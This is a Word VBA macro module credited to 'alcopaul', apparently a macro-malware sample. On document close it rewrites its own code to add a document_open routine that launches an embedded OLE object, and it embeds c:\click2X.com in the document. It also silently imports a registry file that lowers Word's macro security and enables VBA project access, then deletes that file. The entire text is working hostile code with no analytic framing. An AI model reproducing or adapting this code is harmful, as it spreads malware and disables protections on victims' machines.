   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub document_close()
   On Error Resume Next
   Open "c:\xploit.txt" For Output As 2
   Print #2, "sub document_open()"
   Print #2, "On Error Resume Next"
   Print #2, "'by alcopaul"
   Print #2, "obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"
   Print #2, "With ActiveDocument.Shapes(1).OLEFormat"
   Print #2, "    .ActivateAs ClassType:=obj"
   Print #2, "    .Activate"
   Print #2, "End With"
   Print #2, "end sub"
   Close 2
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\xploit.txt", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   ActiveDocument.Shapes.AddOLEObject _
   FileName:="c:\click2X.com", _
   LinkToFile:=False
   ActiveDocument.Save
   Open "c:\vv.reg" For Output As 3
   Print #3, "REGEDIT4"
   Print #3, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
   Print #3, """Level""=dword:00000001"
   Print #3, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
   Print #3, """Level""=dword:00000001"
   Print #3, """AccessVBOM""=dword:00000001"
   Close 3
   Shell "regedit /s c:\vv.reg", vbHide
   Kill "c:\vv.reg"
   End Sub
